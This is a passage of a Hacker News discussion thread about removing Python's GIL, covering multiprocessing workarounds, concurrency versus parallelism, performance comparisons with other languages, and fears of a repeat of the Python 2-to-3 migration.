https://docs.python.org/3/library/multiprocessing.html#share... 4. https://docs.python.org/3/library/multiprocessing.shared_mem...replyKranar 12 hours ago | root | parent | prev | next [–] Fork's copy on write does not mix well with garbage collection.replyAlphaSite 10 hours ago | root | parent | prev | next [–] Python is also going to get a JIT eventually, so they’re fixing that too! One of the concerns with no gil was that it would make certain optimisations harder for the JIT, but it’s very cool to see both being worked on.replyjgalt212 13 hours ago | root | parent | prev | next [–] > Multiprocessing. The answer is to use the python multiprocessing module, or to spin up multiple processes behind wsgi or whatever.I assume mod_wsgi under apache was not the answer here due to memory constraints. That being said, why not serve from disk and use redis for a cache. This should work well unless the queries had high cardinality.replytsimionescu 9 hours ago | root | parent | next [–] Serve what from disk? If they are using python, they are almost certainly writing am api server, not static files.replybmitc 11 hours ago | root | parent | prev | next [–] Or just use a language that was actually designed to be something other than a scripting language?replyWaterluvian 16 hours ago | parent | prev | next [–] No, that’s about right.The response, which isn’t technically wrong, is “unless you’re CPU bound, your application should be parallized with a WSGI. You shouldn’t be loading all that up in memory so it shouldn’t matter that you run 5 Python processes that each handle many many concurrent I/O bound requests.”And this is kinda true… I’ve done it a lot. But it’s very inflexible. I hate programming architectures/patterns/whatnot where the answer is “no you’re doing it wrong. You shouldn’t be needing gigs of memory for your web server. Go learn task queues or whatever.” They’re not always wrong, but very regularly it’s the wrong time to worry about such “anti patterns.”replydotnet00 8 hours ago | root | parent | next [–] Yes, this is even more the case in languages that are popular with more \"applied\" programming audiences, like scientific computing. Telling them \"no you should be using this complicated DBMS\" (or whatever other acronym) is not productive.It tends to get them exceptionally mad because their concern isn't the ideal way to write the code and architect the system, they simply want to write just enough code to continue their research, and even if they did care about proper architecture, they don't have the time or interest in learning/testing a new library for every little thing. They'd rather be putting that time reading up on their field of research.reply9dev 6 hours ago | root | parent | next [–] This stance always rubbed me the wrong way a bit. Effectively, code is one of the tools a researcher uses to do their work. As soon as their work interacts with other people, for example when publishing a purportedly reproducible study or supplying novel algorithms to developers, they have a responsibility to deliver proper work that can be used and understood by other people. This is something we expect of every other profession, yet scientists appear to somehow have no concern for such lowly ambitions.To be clear, I’m not advocating for data scientists to write production-grade webapps. But I absolutely think they should be bothered to write code that fulfills minimal requirements, is reproducible, documented, and mostly bug-free.replydotnet00 5 hours ago | root | parent | next [–] I think data scientists tend to have a lot of overlap with computer people so expectations for them may be a bit higher, my experience comes mainly from physicists.Reproducible, documented and bug free is fine, they care plenty about those things too, the issue is the \"no you're doing it the wrong way, use this entirely different technology instead\" being based almost entirely on ideological reasons.If we take C multithreading as an example, with my superivising scientist, multithreading is fine, he's willing to put some time into learning how it works because it's valuable and has had a stable interface backed by a reliable body for a while now. But if tomorrow you came up to him and insisted that doing multithreading was wrong without a solid technical reason (eg actual bugs and an explanation of how the only way to fix it is to dump the existing code and spend a few months redesigning) you'd get shot down.replyknorker 6 hours ago | root | parent | prev | next [–] Well, it's like showing your plan for painting a room, and asking \"I seem to get stuck here after painting all but the corner, how do I get out of the corner?\". The answer actually is \"don't leave the corner for last\".Or like the martial arts student asking the master \"how do I fight a guy 100m away with a rifle?\" - \"don't be there\".replythreatripper 16 hours ago | parent | prev | next [–] You have a single big data structure that can't be shared easily between multiple processes. Can't you use multiprocessing with that? Maybe mapping the data structure to a file and mmapping that in multiple processes? Maybe wrapping the whole thing in database instead of just using one huge nested dictionary? To me multi-threading sounds so much less painful than all the alternatives that I could imagine. Just adding multi-threading could give you >10x improvement on current hardware without much extra work if your data structure plays nice.replydathinab 16 hours ago | root | parent | next [–] > You have a single big data structure that can't be shared easily between multiple processes. Can't you use multiprocessing with that? Maybe mapping the data structure to a file and mmapping that in multiple processes? Maybe wrapping the whole thing in database instead of just using one huge nested dictionary?ton of additional complexity, not worth it for many use-cases and anything on the line of \"using multiple processes or threads to increase python performance\" does have (or at least did have) quite a bunch of additional foot guns in pythonIn that context porting a very trivial ad-hoc application to Java (or C# or Rust, depending on what knowhow exist in the Team) would faster or at least not much slower to do. But it would be reliable estimable by reducing the chance for any unexpected issues, like less perf then expected.Basically the moment \"use mmap\" or \"use multi-processing\" is a reasonable recommendation for something ad-hocish there is something rally wrong with the tools you use IMHO.replynine_k 9 hours ago | root | parent | next [–] How good is support for numpy / scipy / pandas or equivalents, if they exist, outside Python?Actually the resulting structure should of course be dumped into an RDBMS or a graph DB and served from there more readily. Doing that takes skill and time though, which often are worth applying elsewhere.replythreatripper 16 hours ago | root | parent | prev | next [–] The use case I'm thinking about is very simple: One big data structure that is mostly read from and sometimes written to. Use a single mutex with a shared lock for reading and an exclusive lock for writing. Then the readers are safe and would only block during updates when one writer is active. Everything else beside the data structure can be per-thread and wouldn't interfere.The problem why we wouldn't want to port this application to another language is 100k lines of existing code that is best written in Python and no resources to rewrite all that.replyggm 15 hours ago | root | parent | prev | next [–] > Basically the moment \"use mmap\" or \"use multi-processing\" is a reasonable recommendation for something ad-hocish there is something rally wrong with the tools you use IMHO.Hmm. So you're saying only languages which bury lock and mutex over shared data are appropriate to use for async parallelism over shared data? Because calling explicit lock() and releae() isn't that hard. However it does incur a function call overhead. I suppose some explicit in language support could minimise that partially.replydathinab 14 hours ago | root | parent | next [–] no I never said thatreplykroolik 16 hours ago | root | parent | prev | next [–] One annoying part with multiprocessing in Python is that you could abuse the COW mechanism to save on loading time when forking. But Python stores ref counters together with objects so every single read will bust your COW cache.Now, you wanted it simple, but got to fight with the memory model of a language that wasn't designed with performance in mind, for programs whose focus wasn't performance.replyviraptor 15 hours ago | root | parent | next [–] There's gc.freeze for that now https://docs.python.org/3/library/gc.html#gc.freezeIf you load something big before forking workers, there's no CoW issue with that big structure anymore.replyjustinc-md 11 hours ago | root | parent | next [–] gc.freeze prevents considering the objects in gc, but doesn’t disable reference counting so you’ll still have CoW issues. PEP 683 introduces a way to make an object immortal which disables reference counting, which will address that issue.replyTylerE 6 hours ago | root | parent | prev | next [–] I'd go for a db, yeah, or if that's a really painful mapping, this, erm, is actually the sort of thing Go is pretty good at it, and it's not too hard to write a fairly simple program that will traverse your data structure and communicate via a JSON api or something. That's a useful technique in general - separate the big heavy awkward thing from your main web processes.While I hate how verbose and inexpressive it is, Go does hit a sweet spot of fairly good performance, even multi-core, while still being GCed so it's not nearly as foreign for a native python user.replySanderNL 8 hours ago | parent | prev | next [–] It sounds I/O heavy, but you mention it being CPU-heavy in which case I’d say Python is just not the right tool for the job although you may be able to cope with multiprocessing.replyseverino 2 hours ago | parent | prev | next [–] May I ask why you didn't consider writing that quick implementation in Java in the first place?replyjeremycarter 17 hours ago | parent | prev | next [–] Similar experience. Even with multi process and threads python is slow, very slow. Java, Go and .NET all provide a very performant out of box experience.reply__d 15 hours ago | root | parent | next [–] Python is both an interpreter, and quite dynamic. Both of these lead to lower performance when compared to less dynamic, compiled solutions. All of Java, Go, and .NET are compiled and (much) less dynamic.This is absolutely an expected outcome.replymike_ivanov 14 hours ago | root | parent | next [–] \"absolutely an expected outcome.\"Good day. Is it the right time to talk to you about Common Lisp?replytsimionescu 9 hours ago | root | parent | next [–] To be fair, if you use CL in a similarly dynamic way as Python (don't compile anything, don't add any declarations etc) it won't be that much faster. You'll get some boost out of the stdlib stuff being compiled already, but otherwise it will incur similar performance penalties.replypjmlp 4 hours ago | root | parent | next [–] We can add Smalltalk, SELF, Dylan, JavaScript into the discussion then.reply__d 1 hour ago | root | parent | next [–] And maybe Strongtalkreply__d 13 hours ago | root | parent | prev | next [–] Always a good time.replygpderetta 13 hours ago | root | parent | prev | next [–] These days even elisp can be compiled. I think python need to be dragged kicking and screaming into cutting edge '80s dynamic compilation technology.reply__d 13 hours ago | root | parent | next [–] I'm sure skilled volunteers would be very welcome.There are numerous active, moderately serious efforts to both optimize and/or JIT Python bytecode. I think AOT compilation is mostly out-of-scope for 100% compatibility, but again, there's lots of different efforts to compile either subset languages or subsets of programs.\"Kicking and screaming\" suggests some reluctance to embrace this, but I think that's probably unfair: it's just hard.replypjmlp 4 hours ago | root | parent | next [–] It isn't as if PyPy doesn't exist. Embracing it during the 16 years of its existence is another matter.replycypress66 14 hours ago | root | parent | prev | next [–] Node is pretty performant for anything IO related, not compiled and reasonably dynamic.reply__d 13 hours ago | root | parent | next [–] I think it's worth the clarification that Javascript is usually JITed; (C)Python isn't.And that CPython's I/O isn't really the problem: some of its async event loop implementations are fairly competitive with Node.But still ... yes.Javascript has benefited from two decades of intensive, well-funded work by the best people in the business, with clear focus on performance as a high priority goal. Not to take away from those who work on Python, but I think it's fair to say the effort has had orders of magnitude difference.I don't have a deep enough understanding to say whether the nature of Python or Javascript makes one better suited for performance optimization than the other. Python is perhaps able to benefit from seeing what's been done with Javascript, although of course Javascript has stood on the shoulders of its own giants.replyActorNightly 14 hours ago | root | parent | prev | next [–] 3.11 and on should be comparable to Java for most use cases with multiprocessing (set up correctly of course)replygeysersam 13 hours ago | root | parent | next [–] How do you mean? 3.11 is something like 10-20% faster than earlier Python releases. Why should that make it comparable to Java? Typically Java is still several times faster than Python, and this is totally natural since Java performance benefits from static type declarations and the language is generally less dynamic than Python.That said I still use Python for CPU intensive tasks since in my experience Numpy/Scipy/Numba etc does a good job speeding up the CPU intensive parts of Python code.replyoivey 12 hours ago | root | parent | next [–] Static type declarations don't make Java fast. The compiler does. Dynamically typed languages with no type declarations can be very fast if the compiler can infer the types.That's not to say that Python will ever get there. My understanding is that the design of the language and leaky implementation details make generally compiling Python to fast machine code nearly impossible.replyTillE 12 hours ago | root | parent | next [–] Well, we already have a mature, real-world Python JIT in PyPy, with impressive performance.I dunno if Python is ever gonna be as fast as Java or C#, but we know it can be much better.replymetadat 10 hours ago | root | parent | next [–] I can't find any benchmarks of PyPy vs OpenJDK or GraalVM, but unless I'm mistaken it's still more than 100% difference, and maybe much, much more for pure-Python vs. Java.replymattip 9 hours ago | root | parent | next [–] Here ya go. On these sometimes one is faster, sometimes the other. https://github.com/kostya/jit-benchmarks/blob/master/README.... Personally i don’t like such comparisons. Benchmarking is hard and far from objective. Much of what makes python popular is the developer experience. Generic benchmarks will only give a rough guide about what to expect in your application. If you are in a niche like the OP, you will have to figure out how to handle your bottlenecks.replymetadat 9 hours ago | root | parent | next [–] Eagerly awaiting no-Gil Flask vs. Dropwizard performance analysis.replynesarkvechnep 2 hours ago | parent | prev | next [–] If your data doesn't change, you can leverage HTTP caching and lift a huge burden off of your service.replystrictfp 15 hours ago | parent | prev | next [–] My tip for this is Node.js and some stream processing lib like Highland. You can get ridiculous IO parallelism with a very little code and a nice API.Python just scales terribly, no matter if you use multi-process or not. Java can get pretty good perf, but you'll need some libs or quite a bit of code to get nonblocking IO sending working well, or you're going to eat huge amounts of resources for moderate returns.Node really excels at this use case. You can saturate the lines pretty easily.replyhughesjj 13 hours ago | root | parent | next [–] 0_oDid I miss something? Does nodes/highland have good shared memory semantics these days?I've always felt the best analogy to python concurrency was (node)js, but I admittedly haven't kept up all that well.replyporridgeraisin 12 hours ago | root | parent | prev | next [–] I think they mentioned CPU intensive work, which I'm taking to imply that it's more CPU bound than I/O bound. So unless you're suggesting they use Node's web workers implementation for parallelism, the default single threaded async concurrency model probably won't serve them well.replypid-1 10 hours ago | root | parent | prev | next [–] Isn't Node single threaded, just like Python?replykrylon 4 hours ago | root | parent | next [–] Python is technically multithreaded, but the GIL means only one thread can execute interpreter code at a time. If you use libraries written in C/C++, the library code can run in multiple threads simultaneously if they release the GIL.I vaguely recall Node used to run multiple threads under the hood for disk I/O, but it might use kqueue/epoll these days.replystrictfp 4 hours ago | root | parent | prev | next [–] Node is essentially a single-threaded API to a very capable multithreaded engine.https://youtu.be/ztspvPYybIYreplygoatlover 9 hours ago | root | parent | prev | next [–] Wouldn't Elixir or Go be better for this use case? Node still blocks on compute heavy tasks.replyrrishi 16 hours ago | parent | prev | next [–] I am not too deeply experienced with Python so forgive my ignorance.But I am curious to understand why you were not able to utilize the concurrency tools provided in Python.A quick google search gave me these relevant resources1. An intro to threading in Python (https://realpython.com/intro-to-python-threading/#conclusion...)2. Speed Up Your Python Program With Concurrency (https://realpython.com/python-concurrency/)3. Async IO in Python: A Complete Walkthrough (https://realpython.com/async-io-python/)Forgive me for my naivety. This topic has been bothering me for quite a while.Several people complain about the lack of threading in Python but I run into plenty of blogs and books on concurrency in Python.Clearly there is a lack in my understanding of things.replyJtsummers 15 hours ago | root | parent | next [–] Re (3): asyncio does not give you a boost for CPU bound tasks. It's a single-threaded, cooperative multi-tasking system that can (if you're IO bound) give you a performance boost.replyhughesjj 13 hours ago | root | parent | next [–] Ehhh I mean you're not wrong, but I wouldn't say you're fully right either.You can absolutely send stuff to a thread pool executor or process pool executor and then never await the returned value/never have it \"return until interrupted, but the issues with shared memory (or really, the lack thereof in comparison to ex C) are still present to my understanding.Then again, I mean you can always spin up a sqllite server or something on the same machine, but that's stupid heavy and more of a workaround than a solution. Super excited for nogil.https://docs.python.org/3/library/concurrent.futures.html#co...replymypalmike 12 hours ago | root | parent | next [–] Not sure why you mention \"thread pool executor\", which of course does not get you concurrency due to the gil.replyxcv123 10 hours ago | root | parent | next [–] Pedantic nerd nitpick: it gives you concurrency but not parallelism. (Concurrent threads can be time sliced on one core)replyIshKebab 7 hours ago | root | parent | next [–] It was clear from the context that he meant concurrently running not concurrently in progress. I wish nerds would give up on this parallelism/concurrency pedantry or at least choose some new nomenclature that didn't conflict so massively with the English meaning of \"concurrent\".I mean it's not even right. Most parallel/concurrent pedants would consider multithreaded code to be \"parallel\" even if it is running on a single core.I think the best thing is to talk about threads, because then you can distinguish e.g. OS threads and hardware threads.replyda39a3ee 1 hour ago | root | parent | next [–] > I mean it's not even right. Most parallel/concurrent pedants would consider multithreaded code to be \"parallel\" even if it is running on a single core.Hm, I think running on a single core is the exact definition of what the \"pedants\" say is not parallel. If all you have is one core then you can't achieve parallelism under their definition.I think the terminology is pretty well established now. But I do agree with you that it's a bad choice of words and that it's annoying, intelligent even, for people to pick a particular unintuitive definition and then go around brow-beating people for not using/understanding their definition.replywmwmwm 16 hours ago | root | parent | prev | next [–] You can throw python threads at it, but if each request traverses the big old datastructure using python code and serialises a result then you’re stuck with only one live thread at a time (due to the GIL). In Java it’s so much easier especially if the datastructure is read only or is updated periodically in an atomic fashion. Every attempt to do something like this in python has led me to having to abandon nice pythonic datastructures, fiddle around with shared memory binary formats, before sighing and reaching for java! Especially annoying if the service makes use of handy libraries like numpy/pandas/scipy etc!replyteraflop 16 hours ago | root | parent | prev | next [–] The whole point of the GIL is that even if you use Python's threading or asyncio, you don't get any benefits from scaling beyond a single CPU core, because all of your threads (or coroutines) are competing for a single lock. They run \"concurrently\", but not actually in parallel. The pages you linked explain this in more detail.In theory, multiprocessing could allow you to distribute the workload, but in a situation like OP describes -- just serving API requests based on a data structure -- the overhead of dispatching requests would likely be bigger than the cost of just handling the request in the first place. And your main server process is still a bottleneck for actually parsing the incoming requests and sending responses. So you're unlikely to see a significant benefit.replyaardvark179 16 hours ago | root | parent | prev | next [–] Threading in Python is fine if your threads are io bound or spend their time in a C extension which releases the GIL, if you are bound then the GIL means effectively one thread can run at a time and you gain no advantage from multiple threads.replyindeedmug 11 hours ago | root | parent | prev | next [–] I had this misunderstanding for a long time until I saw Go explain the difference: https://go.dev/blog/waza-talkThe confusion here is parallelism vs concurrency. Parallelism is executing multiple tasks at once and concurrency is the composition of multiple tasks.For example, imagine there is a woodshop with multiple people and there is only one hammer. The people would be working on their projects such as a chair, a table, etc. Everyone needs to use the hammer to continue their project.If someone needed a hammer, they would take the single hammer and use it. There are still other projects going on but everyone else would have to wait until the hammer is free. This is concurrency but not parallelism.If there are multiple hammers, then multiple people could use the hammer at the same time and their project continues. This is parallelism and concurrency.The hammer here is the CPU and the multiple projects are threads. When you have Python concurrency, you are sharing the hammer across different projects, but it's still one hammer. This is useful for dealing with blocking I/O but not computing bottlenecks.Let's say that one of the projects needs wood from another place. There is no point in this project to hold on to the hammer when waiting for wood. This is what those Python concurrency libraries are solving for. In real life, you have tasks waiting on other services such as getting customer info from a database. You don't want the task to be wasting the CPU cycles doing nothing, so we can pass the CPU to another task.But this doesn't mean that we are using more of the CPU. We are still stuck with a single core. If we have a compute bottleneck such as calculating a lot of numbers, then the concurrency libraries don't help.You might be wondering why Python only allows for a single hammer/CPU core. It's because it's very hard to get parallelism properly working, you can end up with your program stalling easily if you don't do it correctly. The underlying data structures of Python were never designed with that in mind because it was meant to be a scripting language where performance wasn't key. Python grew massive and people started to apply Python to areas where performance was key. It's amazing that Python got so far even with GIL IMO.As an aside, you might read about \"multiprocessing\" Python where you can use multiple CPU cores. This is true but there are heavy overhead costs to this. This is like building brand-new workshops with single hammers to handle more projects. This post would get even longer if I explained what is a \"process\" but to put it shortly, it is how the OS, such as Windows or Linux, manages tasks. There is a lot of overhead with it because it is meant to work with all sorts of different programs written in different languages.replywood_spirit 16 hours ago | parent | prev | next [–] That’s right.In the past, for read-only data, I’ve used a disk file and relied on the the OS page cache to keep it performant.For read-write, using a raw file safely gets risky quickly. And alternative languages with parallelism runs rings around python.So getting rid of the GIL and allowing parallelism will be a big boon.replyxcv123 17 hours ago | parent | prev | next [–] > I may have missed somethingYou did not miss anything. The GIL prevents parallel multi threading.replybrightball 16 hours ago | parent | prev | next [–] This is actually one of the reasons I was drawn to Ruby over Python. Ruby also has the GIL but jRuby is an excellent option when needed.replyantod 16 hours ago | root | parent | next [–] I wonder what lead to JRuby attracting support while Jython not? I know the Jython creator went on to other things (was it eg IronPython for dotnet?). I suppose it was the inverse with dotnet - eg IronPython surviving while IronRuby seems dead.Is it just down to corporate sponsorship?replybrightball 15 hours ago | root | parent | next [–] JRuby has been pretty actively maintained for about 15 years and had a big release this year.It’s an impressive project.replykrylon 4 hours ago | root | parent | next [–] I looked into it a long time ago (~10-12 years?), and was disappointed JRuby could not use extensions written in C. It's not surprising in retrospect, for obvious reasons, but has there been some progress in this area?replyempthought 12 hours ago | root | parent | prev | next [–] Twitter used JRuby and invested heavily for a time.replylfkdev 6 hours ago | parent | prev | next [–] You could have just use gunicorn and spawn multiple workers maybereplyTylerE 12 hours ago | parent | prev | next [–] Spin up as many processes as you need, map connections 1:1 to processes if possible.replyqbasic_forever 14 hours ago | parent | prev | next [–] Are you just reading from this data structure? If so I wouldn't do any locking or threading, I'd just use asyncio to serve up read requests to the data and it should scale quite well. Multithreading/processing is best for CPU limited workloads but this sounds like you're really just IO-bound (limited by the very high IO of reading from that data structure in memory).If you're allowing writes to the shared data structure... I'd ask myself am I using the right tool for the job. A proper database server like postgres will handle concurrent writers much, much better than you could code up hastily. And it will handle failures, backups, storage, security, configuration, etc. far better than an ad hoc solution.replyJtsummers 14 hours ago | root | parent | next [–] > I'd just use asyncio to serve up read requests to the data and it should scale quite well.Quoting GP:>> often CPU heavyWe have to take their word for it that it's actually CPU heavy work, but if they're not lying and not mistaken then asyncio would do nothing for them.replytsimionescu 9 hours ago | root | parent | prev | next [–] Reading from memory is really not IO. Perhaps you're suggesting doing something like mmapping a file to memory, putting the data structure in that memory, and then using asyncio on the file to serve things, but this would only work if you can compute byte ranges inside the file to serve ahead of time, in which case there are much simpler solutions anyway. Most likely, when receiving a query they need to actually search through the datastructure based on the query, and it's very likely that this is the bottleneck, not just reading some memory.replywodenokoto 10 hours ago | prev | next [–] When it was an in dev project, I felt the consensus on HN was that it was amazing work and a shame that it looked like the steering committee wouldn’t adopt it.Now they have and everyone seems to hate it.replyBiteCode_dev 8 hours ago | parent | next [–] It's the eternal pendulum:- take no risk, and people will blame the project for being static.- take risks, and people will blame the project for being reckless.E.G:- don't adopt a new feature, and your language is old, becoming irrelevant, and a wave of comments will tell you how they just can't use it for X because they don't have it.- break compat, and you will have a horde stating you don't care about users that need stability. You got one comment in this thread talking about \"the python treadmill\"!And all that for an open source project most don't contribute to and never paid a dime for.replyantupis 7 hours ago | root | parent | next [–] World would need one more language which would have very barebone core something like very minimal go or python but strong metaprogramming features so you could expand language if you need.replywanderingmind 3 hours ago | root | parent | next [–] You are thinking mojo [1] that's claims full python compatibility but can be extended for static typing and high performance scenarios[1] https://www.modular.com/mojoreplymathisfun123 3 hours ago | root | parent | next [–] How many lines of mojo have you written?replygchamonlive 1 hour ago | root | parent | prev | next [–] LISP has been around since the 60sreplyBiteCode_dev 2 hours ago | root | parent | prev | next [–] It wouldn't stay barebone, or would stop being used. That's the point.replysmcl 6 hours ago | parent | prev | next [–] Well these likely will be entirely different groups of people voicing their opinions at different times. I don't imagine those who were enthusiastic about the project originally have done an about-face and now hate it.replythiht 1 hour ago | parent | prev | next [–] Almost as if there was more than 1 person on the internetreplypaulryanrogers 10 hours ago | parent | prev | next [–] My guess, it's easier to dismiss the downsides of something likely to fail, and likewise focus on the positives. Now that the unexpected has happened reality demands more consideration for both.replyrightbyte 5 hours ago | parent | prev | next [–] It is probably language design enthusiasts push all these backwards incompatibilities into Python because they are not the users of the language.They are a different group from those having their code broken in a never ending incompatibility churn.Well atleast it gives us jobs ...replygjulianm 2 hours ago | root | parent | next [–] I'm one of those happy to see the GIL removed. I've had troubles with the 2->3 transition and more recently with the 3.6 EOL, which wasn't as traumatic but still a little bit troublesome. Despite that, I prefer another transition and being able to actually use parallelism in Python rather than rewriting a huge codebase in a different language, and losing the advantages of Python.replyfbdab103 17 hours ago | prev | next [–] Still not encouraged by the no-GIL, \"We don't want another Python 2->3 situation\", yet very little proffered on how to avoid that scenario. More documentation on writing thread-safe code, suggested tooling to lint for race conditions (for whatever it is worth), discussions with popular C libraries, dedicated support channels for top tier packages, what about the enormous long-tail of abandoned extensions which still work today, etc.replydoctoboggan 16 hours ago | parent | next [–] The big and obvious difference is that all the GIL vs no-GIL stuff happens in the background and your average python dev can just ignore it if they want to. The interpreter will note if you have C extensions that don't opt in to no-GIL and then will give you the GIL version.This is _very_ different to the 2-to-3 transition where absolutely every single person, even those who couldn't care less, had to change their code if they wanted to use python 3.replycrabbone 4 hours ago | root | parent | next [–] > your average python dev can just ignore it if they want to.Oh, so naive... All the mutation code in Python which \"worked\" because Python didn't really have any real concurrency. Add to it -- there's no real plan about what to do with Python concurrency. Removing GIL is only one \"half\" of the problem, you need to give developers some sort of a framework to use to deal with concurrency. Python's threads are extremely underdeveloped and dangerous to use. Python doesn't even have anything like \"synchronized\" from the Java world. So, all synchronization requires dealing with locks, mutexes, condition variables...Most Python programs today didn't bother to deal with threads because they didn't confer enough benefits to be worth using. So, \"automatically\" parallelizing Python code, as in allowing it to run in actual threads is going to bring about lots and lots of bugs in trivial code written by people with no clue about concurrency.replyquietbritishjim 3 hours ago | root | parent | next [–] > So, all synchronization requires dealing with locks, mutexes, condition variables...As always, by far the best way to interact between threads is to use thread-safe queues (AKA message passing). Luckily, Python has one of those [1]. No complicated synchronisation needed.[1] https://docs.python.org/3/library/queue.htmlreplygjulianm 2 hours ago | root | parent | prev | next [–] Which code is automatically going to run in threads? As you say, basically nobody uses Python threads. So even enabling no-gil, nothing is going to change because sequential code will still be sequential.replywoodrowbarlow 2 hours ago | root | parent | next [–] any existing async/await code.replygjulianm 1 hour ago | root | parent | next [–] async/await code already runs in threads, so that's not really a change.replyquickthrower2 10 hours ago | root | parent | prev | next [–] But you need to pick your horse. In 5 years time, Python will either be GIL or no GIL, and it is hard to tell which. It might be a setting (which might be more ideal).If you assume nogil, you need to choose dependencies that support that. You may need to trade off: eschew dependencies that aren't looking like they will be nogil compatible by the deadline. You are stuck on Python 3.18 maintenance branch or whatever, rather than the 3.19 (in reality .. 4.0) version.Or choose gil then you can use everything. But is there a prisoners dilemma - everyone picks gil, uses whatever dependencies, library maintainers assuming this don't bother to add nogil support, and then the decision becomes to stick to gil, which if you suspect will happen makes you reason even harder not to support nogil.replygjulianm 2 hours ago | root | parent | next [–] You're missing something, which is that a lot of libraries will be \"i-don't-care-about-gil\". Only native extensions need to choose GIL or noGIL due to the ABI difference, but pure Python libraries should run with the same code in both variants. And a lot of them will probably be thread safe at some level (function or class) without any changes. For those that aren't thread-safe, I bet that quite a lot can just get away with a \"NOT THREAD SAFE\" warning and letting the user wrap access to them with locks.And that's talking about multithreaded code. I bet that even with noGIL, lots of Python code will still continue to be single-threaded, making the gil/no-gil decision irrelevant (save for those native extensions).replydoctoboggan 10 hours ago | root | parent | prev | next [–] I don’t really understand this. Unless I am missing something you should always pick the “no GIL” version as that will work with or without a GIL. Thread safe No GIL code would be totally fine to run on python compiled with the GIL with zero modifications.Because of this I don’t expect there to be multiple versions of any library. Once a library does the (admittedly heavy) lift to no GIL it will just be the main version of that library going forward.replyquickthrower2 10 hours ago | root | parent | next [–] Each library maintainer (probably mostly volunteers) has to decide whether to put effort into making their code thread safe. Clearly it won't be 100% of libraries that \"upgrade\".Then on top of that, they know their effort might be for nothing if the decision is made to keep Python GIL-only all along (one of the possible 3 outcomes at the end of the 5 years: [\"gil\", \"nogil\", \"both supported\").replygjulianm 2 hours ago | root | parent | next [–] But thread-unsafe code is not the same as incompatible code. That's the point. You can just choose to say \"NOT THREAD SAFE\" (just as many C libraries aren't thread safe and need to be wrapped in locks to be used by multiple threads) and users will still be able to use it. More importantly, if it's a pure Python extension, you can just not modify the library and the users will still be able to use it whether or not they have gil or no-gil.replyJoeboy 5 hours ago | root | parent | prev | next [–] > Clearly it won't be 100% of libraries that \"upgrade\".I'm wondering how many libraries with binary extensions are actually in common use. Like, maybe 90% of python projects use a subset of a few hundred such packages?That's a hassle if you maintain one of those packages, and will be a bit disappointing if in 5 years' time you're still depending on GIL-reliant packages.But it's nothing like the chaos of the python 2-3 changes, where ~100% of python files in every package and end-user project had to be fixed.I only learned about this this morning though, it's very possible I'm missing something. A lot of the concerns people are raising look a bit overblown to me.I take the point that after so many abortive GIL removal attempts, it's harder to be confident this one will happen. But having the go-ahead from the steering council seems like a good indicator this one has traction.replydoctoboggan 9 hours ago | root | parent | prev | next [–] That’s true. I was more thinking from the perspective of a library user not library dev. I suspect for some classes of problem going no GIL will be so tantalizing that the work will definitely be done. Either in the incumbent library or an upstart will come out and take over the community with no GIL support.replykzrdude 5 hours ago | root | parent | prev | next [–] Current plan says there has to be separate builds per module, as if it is an ABI break. Would be much better if it could be combined into one build. Hopefully necessity triggers some invention here.replyynik 4 hours ago | root | parent | next [–] There's no way to make it work with the old ABI. Because sizeof(PyObject) is fixed in the old ABI, there's simply no way to attach additional information (e.g. the new cross-thread ref count) to every Python object. The Python ABI (even the \"limited\" stable ABI) exposes too many implementation details, it's not really possible to make any fundamental changes to the Python interpreter without breaking that ABI.You could have a single new ABI supporting both no-GIL and with-GIL, but it wouldn't be compatible with the existing stable ABI.replyzarzavat 11 hours ago | root | parent | prev | next [–] But at least after the transition you could stop caring. NoGIL makes maintainers’ lives worse permanently because now you have to care about it forever if you publish a library.replydoctoboggan 11 hours ago | root | parent | next [–] Why? Once you make your code thread safe it can be run as-is on python compiled with a GIL.replyLexiMax 17 hours ago | parent | prev | next [–] In a past life I hacked on PHP for a living, and in the time it took Python 2 to ride off into the sunset, PHP got two major migrations under its belt in 5.2 to 5.3, and then again 5.6 to 7.0.It was amazing to see the contrast between the two languages. PHP gave you plenty of reasons to upgrade, and the amount of incompatible breaking changes was kept to a minimum, often paired with a way to easily shim older code to continue working.I really hope to see no-GIL make it into Python, but in the back of my mind I also worry about what lessons were learned from the 2 to 3 transition. Does the Python team have a more effective plan this time around?replycharrondev 16 hours ago | root | parent | next [–] I’ve taken an application codebase from PHP 5.3 to 8.2 now and it was relatively easy the whole way.The real key to minimize the pain was writing effective integration tests with high coverage. We didn’t have a good test suite to start but once we added some utilities to easily call our various endpoints (and internal API client if you will) and make assertions about the coverage came quickly.Popular frameworks like Laravel offer such test utilities out of the box now.That combined with static analysis tools like psalm make it so we can fearlessly move past major upgrades.One thing I was surprised at was just how much crap PHP allowed with just a notice (not even a warning for a long time). A lot of that stuff still works (although over time some notices have progressed to warnings or errors gradually). We have our test suite convert any notices or warnings to exceptions and fail the test case.replyacdha 15 hours ago | root | parent | next [–] > The real key to minimize the pain was writing effective integration tests with high coverageI think this makes it really hard to do comparisons: I’ve done Python 2 to 3 migrations which took an hour or two because the code had tests and was well-maintained, and PHP migrations which were painful slogs without tests and sloppy code (“is this ignored error new or something we should have fixed in the 2000s?”). Most developers don’t have enough data points to say whether the experience they had was due to the language or the culture.replycharrondev 13 hours ago | root | parent | next [–] I’m not familiar enough with the python transition to say much. I can think of a few things that the PHP developers did that helped make the transition easier:- multibyte aware string functions were implemented as a separate (and optional) extension with separately named functions (prefixed with mb) and there was a popular community polyfill from the Symfony project (and is for many new language functions). - Weird sloppy behaviours (like performing array access on a Boolean, or trying to access a property on null, and many more than would silently just turn into null/false) had lengthy deprecation periods and if you had error logging turned on you could clean these up relatively easily even without a big test suite.replyacdha 12 hours ago | root | parent | next [–] > multibyte aware string functions were implemented as a separate (and optional) extension with separately named functions (prefixed with mb)Python had a different take on this with some interesting psychology: you had a new string type which had to explicitly be converted (i.e. concatenating a Unicode string with a byte string causes an exception), which had a stark divide. Projects which had previously handled Unicode correctly converted almost trivially, but the projects which had been sloppy were a morass trying to figure out where Unicode was desirable and where you really needed raw bytes. Almost all of the code I saw where this was a problem didn’t handle Unicode properly but the developers _hated_ the idea of the language forcing them to fix those bugs.replyLexiMax 2 hours ago | root | parent | next [–] There were valid reasons to be upset at Python 3's handling of Unicode.- https://lucumr.pocoo.org/2014/5/12/everything-about-unicode/- Discussion: https://news.ycombinator.com/item?id=7732572- https://gregoryszorc.com/blog/2020/01/13/mercurial%27s-journ...- Discussion: https://news.ycombinator.com/item?id=22036773Chalking these complaints up to bad development practices is _precisely_ the reason why the Python 3 migration was handled so poorly. If this attitude is repeated for no-GIL Python, it will fail.replythiht 1 hour ago | parent | prev | next [–] > Note that if the program imports one single C-extension that uses the GIL on the no-GIL build, it's designed to 